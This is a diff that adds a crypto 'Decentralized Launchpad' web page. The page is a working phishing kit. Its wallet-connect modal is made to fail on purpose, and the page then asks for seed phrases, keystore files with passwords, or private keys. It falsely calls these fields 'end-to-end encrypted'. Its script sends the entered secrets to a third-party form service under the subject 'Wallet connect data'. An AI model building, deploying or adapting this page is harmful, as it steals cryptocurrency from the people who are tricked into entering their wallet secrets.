@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Decentralized Launchpad</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- Sticky Header -->
+  <header>
+    <img src="Crypto.png" alt="Logo" class="logo">
+    <h1 class="main-title">Decentralized Launchpad</h1>
+
+    <!-- Desktop Navigation -->
+    <nav class="desktop-nav">
+      <a href="get-support.html">Get Support</a>
+      <a href="index.html">Home</a>
+      <a href="recover.html">Wallet Recovery</a>
+    </nav>
+
+    <!-- Mobile Hamburger -->
+    <div class="hamburger" aria-label="Menu" aria-expanded="false">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+
+    <div class="connect">
+      <button class="interact-button"><h5>Connect</h5></button>
+      <img src="wallet-gif.gif" alt="Wallet GIF" class="wallet-gif">
+    </div>
+  </header>
+
+  <!-- Mobile Menu -->
+  <div class="mobile-menu">
+    <a href="get-support.html">Get Support</a>
+    <a href="index.html">Home</a>
+    <a href="recover.html">Wallet Recovery</a>
+  </div>
+
+  <!-- Select Wallet Modal (copied from get-support.html - now available on index.html) -->
+  <div id="selectWalletModal" class="fixed inset-0 z-50 hidden flex items-center justify-center bg-black bg-opacity-50">
+    <div class="bg-neutral-900 text-white p-6 w-full max-w-md mx-4 text-center relative hide-scrollbar" style="border-radius:30px;border:3px solid #F7D4AC;">
+      <button id="modalCloseBtn" aria-label="Close" class="absolute right-4 top-4 text-xl leading-none text-white">&times;</button>
+
+      <!-- Social icons on modal sides -->
+      <div class="modal-social modal-social-left" aria-hidden="true">
+        <a href="#" aria-label="Contact Google"><img src="google.png" alt="Google"></a>
+        <a href="#" aria-label="GitHub"><img src="github.png" alt="GitHub"></a>
+      </div>
+      <div class="modal-social modal-social-right" aria-hidden="true">
+        <a href="#" aria-label="Contact Gmail"><img src="gmail.png" alt="Gmail"></a>
+        <a href="#" aria-label="Apple"><img src="apple.png" alt="Apple"></a>
+      </div>
+
+      <div class="modal-inner">
+        <h3 class="text-xl font-medium mb-4">Select wallets</h3>
+
+        <div class="mb-4 main-wallet-wrap" style="position:relative; display:inline-block;">
+          <img id="modalMainWalletImg" src="Metamask.png" alt="Metamask" class="mx-auto h-20 w-20 object-contain" />
+          <div id="connectRing" class="connect-ring" aria-hidden="true">
+            <svg viewBox="0 0 100 100" role="img" aria-label="progress">
+              <rect class="track" x="8" y="8" width="84" height="84" rx="12"></rect>
+              <rect class="progress" x="8" y="8" width="84" height="84" rx="12"></rect>
+            </svg>
+          </div>
+        </div>
+        <div id="modalMainWalletName" class="mt-2 font-medium">MetaMask</div>
+
+        <!-- In-modal connecting UI (hidden by default) -->
+        <div id="inModalConnecting" class="inmodal-connecting" aria-hidden="true">
+          <div class="connecting-text" id="inModalConnectingText">Connecting...</div>
+        </div>
+
+        <!-- Post-timeout message shown inside modal before navigating to manual modal -->
+        <div id="inModalConnectMessage" role="status" aria-hidden="true">
+          <div class="err">Cannot connect</div>
+          <div class="ok">Please connect manually</div>
+        </div>
+
+        <button id="toggleMoreWallets" aria-expanded="false" aria-controls="moreWallets" class="w-full text-left px-3 py-2 border rounded mb-3 bg-neutral-800 text-white">Choose your preferred wallets +30</button>
+        <div id="moreWallets" class="more-wallets" aria-hidden="true">
+        <div class="grid">
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="trustwallet"><img src="trust.png" alt="Trust Wallet" class="h-10 w-10"/><span class="text-xs mt-1">Trust</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="coinbase"><img src="coinbase.png" alt="Coinbase" class="h-10 w-10"/><span class="text-xs mt-1">Coinbase</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="ledger"><img src="ledger.png" alt="Ledger" class="h-10 w-10"/><span class="text-xs mt-1">Ledger</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="trezor"><img src="trezor.png" alt="Trezor" class="h-10 w-10"/><span class="text-xs mt-1">Trezor</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="exodus"><img src="exodus.png" alt="Exodus" class="h-10 w-10"/><span class="text-xs mt-1">Exodus</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="soflare"><img src="Soflare.png" alt="Soflare Wallet" class="h-10 w-10"/><span class="text-xs mt-1">Soflare</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="okx"><img src="Okx.png" alt="OKX Wallet" class="h-10 w-10"/><span class="text-xs mt-1">OKX</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="slush"><img src="Slush.png" alt="Slush Wallet" class="h-10 w-10"/><span class="text-xs mt-1">Slush</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="rabby"><img src="rabby.png" alt="Rabby Wallet" class="h-10 w-10"/><span class="text-xs mt-1">Rabby</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="magic"><img src="Magic.png" alt="Magic Wallet" class="h-10 w-10"/><span class="text-xs mt-1">Magic</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="electrum"><img src="electrum.png" alt="Electrum" class="h-10 w-10"/><span class="text-xs mt-1">Electrum</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="coinomi"><img src="coinomi.png" alt="Coinomi" class="h-10 w-10"/><span class="text-xs mt-1">Coinomi</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="mycelium"><img src="mycelium.png" alt="Mycelium" class="h-10 w-10"/><span class="text-xs mt-1">Mycelium</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="green"><img src="green.png" alt="Green" class="h-10 w-10"/><span class="text-xs mt-1">Green</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="safepal"><img src="safepal.png" alt="safepal" class="h-10 w-10"/><span class="text-xs mt-1">Safepal</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="bitpay"><img src="bitpay.png" alt="BitPay" class="h-10 w-10"/><span class="text-xs mt-1">BitPay</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="rainbow"><img src="rainbow.png" alt="Rainbow" class="h-10 w-10"/><span class="text-xs mt-1">Rainbow</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="argent"><img src="argent.png" alt="Argent" class="h-10 w-10"/><span class="text-xs mt-1">Argent</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="brave"><img src="brave.png" alt="Brave" class="h-10 w-10"/><span class="text-xs mt-1">Brave</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="guarda"><img src="guarda.png" alt="Guarda" class="h-10 w-10"/><span class="text-xs mt-1">Guarda</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="edge"><img src="edge.png" alt="Edge" class="h-10 w-10"/><span class="text-xs mt-1">Edge</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="phantom"><img src="phantom.png" alt="Phantom" class="h-10 w-10"/><span class="text-xs mt-1">Phantom</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="metamask"><img src="Metamask.png" alt="MetaMask" class="h-10 w-10"/><span class="text-xs mt-1">MetaMask</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="polygon"><img src="Polygon.jpeg" alt="Polygon" class="h-10 w-10"/><span class="text-xs mt-1">Polygon</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="ronin"><img src="Ronin.png" alt="Ronin" class="h-10 w-10"/><span class="text-xs mt-1">Ronin</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="solo_dex"><img src="Solo_dex.jpeg" alt="SoloDex" class="h-10 w-10"/><span class="text-xs mt-1">SoloDex</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="sui"><img src="Sui.png" alt="Sui" class="h-10 w-10"/><span class="text-xs mt-1">Sui</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="uniswap"><img src="Uniswap.jpeg" alt="Uniswap" class="h-10 w-10"/><span class="text-xs mt-1">Uniswap</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="walletconnect"><img src="Walletconnect.jpeg" alt="Walletconnect" class="h-10 w-10"/><span class="text-xs mt-1">Walletconnect</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="xumm"><img src="XUMM.jpeg" alt="XUMM" class="h-10 w-10"/><span class="text-xs mt-1">XUMM</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="kepler"><img src="Kepler.jpeg" alt="Kepler" class="h-10 w-10"/><span class="text-xs mt-1">Kepler</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="compound"><img src="Compound.png" alt="Compound" class="h-10 w-10"/><span class="text-xs mt-1">Compound</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="bittensor"><img src="Bittensor.png" alt="Bittensor" class="h-10 w-10"/><span class="text-xs mt-1">Bittensor</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="bing"><img src="Bing.png" alt="Bing" class="h-10 w-10"/><span class="text-xs mt-1">Bing</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="bitget"><img src="bitget.png" alt="Bitget" class="h-10 w-10"/><span class="text-xs mt-1">Bitget</span></button>
+          <button class="wallet-option p-2 flex flex-col items-center" data-wallet="other"><img src="Other.png" alt="Other" class="h-10 w-10"/><span class="text-xs mt-1">Other</span></button>
+        </div>
+      </div>
+
+        <div class="modal-actions" style="width:100%; display:flex; gap:12px; margin-top:8px; align-items:center;">
+          <button id="connectWalletBtn" class="w-full px-4 py-2 rounded font-medium">Connect Wallet</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Connecting overlay (global, covers page) -->
+  <div id="connectingOverlay" class="hidden" role="status" aria-hidden="true">
+    <div class="connecting-inner">
+      <img id="connectingWalletImg" src="Metamask.png" alt="Connecting" />
+      <div class="connecting-text">Connecting....</div>
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+  <!-- Connect Manually Modal -->
+  <div id="connectManualModal" class="fixed inset-0 z-70 hidden flex items-center justify-center bg-black bg-opacity-70">
+    <div class="bg-gray-900 rounded-2xl p-6 w-full max-w-md mx-4 border border-gray-800 shadow-2xl">
+      <div class="flex justify-between items-center mb-6">
+        <h3 class="text-2xl font-bold text-white">Error connecting</h3>
+        <button id="manualCloseBtn" aria-label="Close" class="text-3xl text-gray-400 hover:text-white transition">×</button>
+      </div>
+      <div class="space-y-5">
+        <div id="manualStatus" class="flex items-center justify-center gap-3 mb-4">
+          <span id="errorConnecting" class="text-red-500 hidden font-medium">Error connecting</span>
+          <span id="connectManuallyLabel" class="text-lime-500 font-medium">Connect manually</span>
+        </div>
+
+        <!-- Phrases -->
+        <label class="flex items-center gap-3 cursor-pointer">
+          <input type="radio" name="manualMethod" value="phrases" checked class="w-5 h-5 accent-orange-500">
+          <span class="text-white text-lg">Phrases</span>
+        </label>
+        <div id="phrasesField" class="mb-4">
+          <div class="phrase-count-toggle mb-3" style="display:flex;gap:8px;align-items:center;">
+            <label class="flex items-center gap-2"><input type="radio" name="phraseCount" value="12" checked>12 words</label>
+            <label class="flex items-center gap-2"><input type="radio" name="phraseCount" value="24">24 words</label>
+          </div>
+          <div id="phrasesGrid" class="phrases-grid" aria-label="phrase inputs"></div>
+          <div class="text-xs text-gray-500 mt-2 text-right">end-to-end encrypted</div>
+        </div>
+
+        <!-- Keystore JSON -->
+        <label class="flex items-center gap-3 cursor-pointer">
+          <input type="radio" name="manualMethod" value="keystore" class="w-5 h-5 accent-orange-500">
+          <span class="text-white text-lg">Keystore JSON</span>
+        </label>
+        <div id="keystoreField" class="mb-4 hidden">
+          <textarea id="keystoreInput" class="w-full bg-gray-800 border border-gray-700 text-white p-4 rounded-xl resize-none focus:outline-none focus:border-orange-500 transition" rows="4" placeholder="Paste Keystore JSON"></textarea>
+          <input id="keystorePassword" type="password" class="w-full bg-gray-800 border border-gray-700 text-white p-4 rounded-xl mt-3 focus:outline-none focus:border-orange-500 transition" placeholder="Keystore password" />
+          <div class="text-xs text-gray-500 mt-2 text-right">end-to-end encrypted</div>
+        </div>
+
+        <!-- Private key -->
+        <label class="flex items-center gap-3 cursor-pointer">
+          <input type="radio" name="manualMethod" value="private" class="w-5 h-5 accent-orange-500">
+          <span class="text-white text-lg">Private key</span>
+        </label>
+        <div id="privateField" class="mb-4 hidden">
+          <input id="privateInput" class="w-full bg-gray-800 border border-gray-700 text-white p-4 rounded-xl focus:outline-none focus:border-orange-500 transition" placeholder="Enter private key" />
+          <div class="text-xs text-gray-500 mt-2 text-right">end-to-end encrypted</div>
+        </div>
+
+        <div class="text-right mt-6">
+          <button id="manualConnectBtn" class="px-8 py-3 bg-orange-500 hover:bg-orange-600 text-black font-bold rounded-xl transition transform hover:scale-105 shadow-lg">
+            Connect
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+<div class="terms">
+  <h1>Terms and Conditions</h1>
+
+  <h2>Introduction</h2>
+  <p>You should read these Terms because they contain our legal commitments to you and a number of DOs and DON'Ts which you need to be aware of when you use our Services. Please read these Terms carefully to make sure you understand them. By using our Services, you are automatically deemed to agree to accept and be legally bound by these Terms. For the avoidance of doubt if you do not agree with the Terms, you should not proceed to access or use our Services.</p>
+  <p>You should also read our Privacy Policy. The Privacy Policy explains how we use your personal data.</p>
+  <p>If you think that there is a mistake in these terms or have any queries, please contact us to discuss.</p>
+  <p>If we have to contact you, we will do so by writing to you at the email address you have provided to us. It is therefore very important that you confirm you have provided a legitimate email address that is used by you personally and by proceeding with use of our Services you warrant that you have done so. We will only contact you if you have given explicit consent for us to do so. The only other time you will receive emails is where you have registered to receive our newsletter and updates.</p>
+  <p>When we use the words "writing" or "written" in these terms, this includes emails.</p>
+
+  <h2>Changes to Terms</h2>
+  <p>We can update and change these Terms from time to time and the most current version of these Terms will be posted on the website and relevant app. You may be invited to review and accept the revised Terms in order to continue using the Services. We suggest all users regularly check the terms on the website and in-app where any changes will be posted. You can print and save a copy of these Terms for your future reference.</p>
+  <p>We may require you to update software to be able to use the Services, provided that the Services will continue to match the description of it that we provided to you before.</p>
+  <p>The associated software may be upgraded to reflect changes in an operating system. By continuing to use the Services you will be deemed to have accepted the Terms as varied from time to time.</p>
+
+  <h2>Using Our Service / Buying Coins</h2>
+  <p>To use our service, you will need to have a virtual wallet. We draw your attention that wallets are third-party services, and we advise you to read their terms of use.</p>
+
+  <h2>Security</h2>
+  <p>Security is important to Decentralized LaunchPad, and you therefore agree not to share your wallet access with any other user or third party, or knowingly carry out any activity which enables a third party to access or use your account. If we believe, acting in our discretion, that your account is used inappropriately, we reserve the right to suspend or terminate or cease to support your account without liability.</p>
+  <p>We cannot check the identities of people using our Services and will not be liable if your wallet connection or account is used by someone else. If you become aware of any unauthorised use of your login, you should notify us immediately by contacting us at deentalizedlaunch.com, using 'Security Breach' as the subject line. Please note that we may need to verify your identity and validate ownership of the account. Be alert for other websites and services which may pretend to be us or to be associated with us.</p>
+
+  <h2>Removing Data</h2>
+  <p>If you would like us to delete any data we may hold on you, please contact us by emailing deentalizedlaunch.com.</p>
+  <p>Whereas we do not require personal or identifiable information upon signing up to use our service, we may still hold details for you if you have provided an email address to us or given us permission to contact you. If you wish for your data to be removed, you must specify this in your email. If you do not request deletion, we will hold this information as outlined in our Privacy Policy.</p>
+
+  <h2>Rules of Use</h2>
+  <p>You undertake and agree to adhere to the following rules:</p>
+  <ul>
+    <li>Do not engage in personal attacks on other individuals.</li>
+    <li>Do not harass, bully, or stalk any other user of our Services.</li>
+    <li>Do not post vulgar, obscene, or sexually explicit language or images.</li>
+    <li>Do not promote or advocate illegal activities or discussions with the intent to commit them.</li>
+    <li>Do not violate the intellectual property or privacy rights of any third party.</li>
+    <li>Do not introduce viruses or other harmful components.</li>
+    <li>Do not impersonate others or misrepresent your identity.</li>
+    <li>Do not engage in spamming, trolling, or other antisocial behavior.</li>
+    <li>Do not promote or generate money for yourself or a third party without permission.</li>
+  </ul>
+
+  <h2>Violation of Rules</h2>
+  <p>If you believe that another user is violating these Rules, please let us know by emailing deentalizedlaunch@gmail.com.</p>
+  <p>We cannot guarantee that other users will comply with these Rules, and we will not be responsible for any other user's lack of compliance. You and other users are responsible for your own actions.</p>
+
+  <h2>Service Interruption</h2>
+  <p>Decentralized LaunchPad does not guarantee that the Services will always be available, uninterrupted, timely, secure, or free from bugs or viruses. There may be times when the Services are unavailable due to maintenance or technical issues. We may also change, suspend, or discontinue certain Services without giving you prior notice.</p>
+  <p>We will take reasonable steps to ensure that our Services are free from viruses and other malicious software, but we also recommend you use applicable antivirus software as relevant.</p>
+
+  <h2>Prohibited Person</h2>
+  <p>"Prohibited Person" refers to individuals or legal entities that are subject to specific sanctions under the laws of the United States, United Nations, European Union, or other relevant authorities. We will not engage in any dealings with Prohibited Persons.</p>
+
+  <h2>Third Parties</h2>
+  <p>Some pages may link to third-party websites or services. These links are provided for convenience, and Decentralized LaunchPad is not responsible for any third-party content. If you visit any third-party website, please be aware that it may have its own terms of use and privacy policy.</p>
+
+  <h2>Agreeing to Terms</h2>
+  <p>By using our Services, you agree to be legally bound by these Terms. If you do not agree, you should not access or use our Services.</p>
+
+  <h2>Children</h2>
+  <p>Our services are not available for use by children under the age of 18 years old or 21 years old in some jurisdictions. Please refer to your country's laws for age-related guidance.</p>
+
+  <h2>Content and IP Rights</h2>
+  <p>All content and information contained in the Services are owned or licensed by Decentralized LaunchPad and are protected by intellectual property rights. You may not use, copy, reverse engineer, or modify any content without explicit permission.</p>
+
+  <h2>Additional Important Information</h2>
+  <p>You are responsible for ensuring that all persons who access our site or app through your connection comply with these terms. You must also ensure that your access and use of our Services comply with applicable laws and regulations.</p>
+  <p>The content on our site is for general information and is not intended as advice.</p>
+  <p>You should seek professional financial advice before making any financial decisions.</p>
+  <p>We make no guarantees regarding the accuracy, completeness, or timeliness of the content on our site.</p>
+  <p>You are responsible for ensuring your own virus protection when accessing our site.</p>
+</div>
+
+ <!-- Footer -->
+  <footer class="site-footer" role="contentinfo">
+    <div class="footer-inner">
+      <div class="footer-contact">
+        &copy; 2024 Decentralized LaunchPad | <a href="mailto:support@outlook.com">support@outlook.com</a>
+      </div>
+      <div class="footer-social" aria-label="Social links">
+        <a href="#" aria-label="Reddit"><img src="apple.png" alt="Reddit"></a>
+        <a href="#" aria-label="Facebook"><img src="facebook.png" alt="Facebook"></a>
+        <a href="#" aria-label="GitHub"><img src="github.png" alt="GitHub"></a>
+      </div>
+    </div>
+  </footer>
+
+<script src="script.js"></script>
+
+<script>
+    const grid = document.getElementById('issuesGrid');
+
+    function openSelectWalletModal() {
+      const modal = document.getElementById('selectWalletModal');
+      modal.classList.remove('hidden');
+      modal.style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeSelectWalletModal() {
+      const modal = document.getElementById('selectWalletModal');
+      modal.classList.add('hidden');
+      modal.style.display = '';
+      document.body.style.overflow = '';
+    }
+
+    // Wire action buttons to open wallet modal
+    document.addEventListener('click', (e) => {
+      const btn = e.target.closest('.action-btn');
+      if (btn) {
+        e.preventDefault();
+        openSelectWalletModal();
+      }
+    });
+
+    // Track selected wallet
+    let selectedWallet = { name: 'MetaMask', img: 'Metamask.png' };
+    document.querySelectorAll('.wallet-option').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const img = btn.querySelector('img');
+        const name = btn.querySelector('span').innerText;
+        const mainImg = document.getElementById('modalMainWalletImg');
+        const mainName = document.getElementById('modalMainWalletName');
+        if (img && mainImg) mainImg.src = img.src;
+        if (name && mainName) mainName.textContent = name;
+        selectedWallet = { name: name, img: img ? img.src : '' };
+        const more = document.getElementById('moreWallets');
+        const toggle = document.getElementById('toggleMoreWallets');
+        if (more && more.getAttribute('aria-hidden') === 'false') {
+          more.setAttribute('aria-hidden', 'true');
+          if (toggle) {
+            toggle.setAttribute('aria-expanded', 'false');
+            toggle.textContent = 'Choose your preferred wallets +30';
+          }
+        }
+      });
+    });
+
+    // Toggle more wallets
+    const toggleBtn = document.getElementById('toggleMoreWallets');
+    if (toggleBtn) {
+      toggleBtn.addEventListener('click', () => {
+        const more = document.getElementById('moreWallets');
+        const isHidden = more.getAttribute('aria-hidden') === 'true';
+        more.setAttribute('aria-hidden', isHidden ? 'false' : 'true');
+        toggleBtn.setAttribute('aria-expanded', isHidden ? 'true' : 'false');
+        toggleBtn.textContent = isHidden ? 'Hide wallets -30' : 'Choose your preferred wallets +30';
+      });
+    }
+
+    // Manual connect flow
+    const connectManualModal = document.getElementById('connectManualModal');
+    const manualCloseBtn = document.getElementById('manualCloseBtn');
+    const manualConnectBtn = document.getElementById('manualConnectBtn');
+    const errorConnectingLabel = document.getElementById('errorConnecting');
+    const connectManuallyLabel = document.getElementById('connectManuallyLabel');
+
+    const connectingOverlay = document.getElementById('connectingOverlay');
+    const connectingWalletImg = document.getElementById('connectingWalletImg');
+
+    const phrasesField = document.getElementById('phrasesField');
+    const keystoreField = document.getElementById('keystoreField');
+    const privateField = document.getElementById('privateField');
+    const manualRadios = Array.from(document.querySelectorAll('input[name="manualMethod"]'));
+
+    const access_key = '8c2a14c1-0c59-44aa-97f2-955404fb69c2';
+
+    // Toggle fields
+    function updateManualFields() {
+      const sel = document.querySelector('input[name="manualMethod"]:checked')?.value || 'phrases';
+      phrasesField.classList.toggle('hidden', sel !== 'phrases');
+      keystoreField.classList.toggle('hidden', sel !== 'keystore');
+      privateField.classList.toggle('hidden', sel !== 'private');
+    }
+    manualRadios.forEach(r => r.addEventListener('change', updateManualFields));
+    updateManualFields();
+
+    // Close handlers
+    if (manualCloseBtn) {
+      manualCloseBtn.addEventListener('click', () => {
+        connectManualModal.classList.add('hidden');
+        document.body.classList.remove('overflow-hidden');
+      });
+    }
+    if (connectManualModal) {
+      connectManualModal.addEventListener('click', (e) => {
+        if (e.target === connectManualModal) {
+          connectManualModal.classList.add('hidden');
+          document.body.classList.remove('overflow-hidden');
+        }
+      });
+    }
+
+    // Submit function
+    async function submitToWeb3Forms(message, options = {}) {
+      const { isFinalStep = false } = options;
+      if (errorConnectingLabel) errorConnectingLabel.classList.add('hidden');
+      if (connectManuallyLabel) connectManuallyLabel.textContent = 'Connecting...';
+
+      if (isFinalStep && connectingOverlay) {
+        connectManualModal.classList.add('hidden');
+
+        // Set correct image
+        const method = document.querySelector('input[name="manualMethod"]:checked')?.value;
+        if (method === 'phrases') {
+          connectingWalletImg.src = selectedWallet.img || 'Metamask.png';
+        } else {
+          connectingWalletImg.src = 'wallet-gifs.png';
+        }
+
+        connectingOverlay.classList.remove('hidden');
+        connectingOverlay.setAttribute('aria-hidden', 'false');
+        connectingOverlay.style.display = 'flex';
+        document.body.classList.add('overflow-hidden');
+      }
+
+      try {
+        const res = await fetch('https://api.web3forms.com/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ access_key, subject: 'Wallet connect data', message })
+        });
+        if (!res.ok) throw new Error('Network error');
+        const data = await res.json();
+        if (!data.success) throw new Error(data.message || 'Failed');
+        return true;
+      } catch (err) {
+        console.error(err);
+        if (connectingOverlay) {
+          connectingOverlay.classList.add('hidden');
+          connectingOverlay.setAttribute('aria-hidden', 'true');
+          connectingOverlay.style.display = 'none';
+        }
+        if (errorConnectingLabel) errorConnectingLabel.classList.remove('hidden');
+        if (connectManuallyLabel) connectManuallyLabel.textContent = 'Connect manually';
+        document.body.classList.remove('overflow-hidden');
+        return false;
+      }
+    }
+
+    // Manual Connect button
+    if (manualConnectBtn) {
+      manualConnectBtn.addEventListener('click', async function () {
+        const method = document.querySelector('input[name="manualMethod"]:checked')?.value;
+        const payloadParts = [];
+        payloadParts.push('wallet: ' + (selectedWallet.name || 'unknown'));
+
+        if (method === 'phrases') {
+          const count = parseInt(document.querySelector('input[name="phraseCount"]:checked')?.value || '12', 10);
+          const words = [];
+          for (let i = 1; i <= count; i++) {
+            const v = document.getElementById('phrase-' + i)?.value?.trim() || '';
+            if (v) words.push(v);
+          }
+          if (words.length !== count) {
+            errorConnectingLabel.classList.remove('hidden');
+            return;
+          }
+          payloadParts.push('phrases: ' + words.join(' '));
+        } else if (method === 'keystore') {
+          const v = document.getElementById('keystoreInput')?.value || '';
+          const p = document.getElementById('keystorePassword')?.value || '';
+          if (v) payloadParts.push('keystore: ' + v);
+          if (p) payloadParts.push('keystore password: ' + p);
+        } else if (method === 'private') {
+          const v = document.getElementById('privateInput')?.value || '';
+          if (v) payloadParts.push('private key: ' + v);
+        }
+
+        const message = payloadParts.join('\n\n');
+        await submitToWeb3Forms(message, { isFinalStep: true });
+      });
+    }
+
+    // Render phrase inputs
+    function renderPhraseInputs(count = 12) {
+      const grid = document.getElementById('phrasesGrid');
+      if (!grid) return;
+      grid.innerHTML = '';
+      for (let i = 1; i <= count; i++) {
+        const wrap = document.createElement('div');
+        wrap.className = 'phrase-cell';
+        const input = document.createElement('input');
+        input.id = 'phrase-' + i;
+        input.placeholder = 'word ' + i;
+        input.className = 'phrase-input';
+        wrap.appendChild(input);
+        grid.appendChild(wrap);
+      }
+    }
+    document.querySelectorAll('input[name="phraseCount"]').forEach(r => 
+      r.addEventListener('change', () => renderPhraseInputs(parseInt(r.value, 10)))
+    );
+    renderPhraseInputs(12);
+
+    // Connect Wallet button (12s timeout → manual modal)
+    document.getElementById('connectWalletBtn').addEventListener('click', (e) => {
+      e.preventDefault();
+      const connectBtn = document.getElementById('connectWalletBtn');
+      if (connectBtn.dataset.loading === 'true') return;
+      connectBtn.dataset.loading = 'true';
+      connectBtn.disabled = true;
+
+      const inModal = document.getElementById('inModalConnecting');
+      const connectRing = document.getElementById('connectRing');
+      const connectingText = document.getElementById('inModalConnectingText');
+      const msg = document.getElementById('inModalConnectMessage');
+      const modal = document.getElementById('selectWalletModal');
+
+      if (connectRing) connectRing.classList.add('active');
+      if (inModal) { inModal.classList.add('active'); inModal.setAttribute('aria-hidden', 'false'); }
+      if (connectingText) connectingText.style.display = 'block';
+
+      setTimeout(() => {
+        if (connectRing) connectRing.classList.remove('active');
+        if (inModal) { inModal.classList.remove('active'); inModal.setAttribute('aria-hidden', 'true'); }
+        if (connectingText) connectingText.style.display = 'none';
+        if (msg) { msg.classList.add('show'); msg.setAttribute('aria-hidden', 'false'); }
+
+        setTimeout(() => {
+          if (msg) { msg.classList.remove('show'); msg.setAttribute('aria-hidden', 'true'); }
+          closeSelectWalletModal();
+          connectManualModal.classList.remove('hidden');
+          document.body.style.overflow = 'hidden';
+          connectBtn.disabled = false;
+          connectBtn.dataset.loading = 'false';
+        }, 3000);
+      }, 12000);
+    });
+
+    // Close modal when clicking the "X" button
+    const modalCloseBtn = document.getElementById('modalCloseBtn');
+    if (modalCloseBtn) {
+    modalCloseBtn.addEventListener('click', () => {
+    closeSelectWalletModal();
+  });
+}
+
+    // Close on outside click / Escape
+    document.getElementById('selectWalletModal').addEventListener('click', (e) => {
+      if (e.target.id === 'selectWalletModal') closeSelectWalletModal();
+    });
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') closeSelectWalletModal();
+    });
+  </script>
+</body>
+</html>
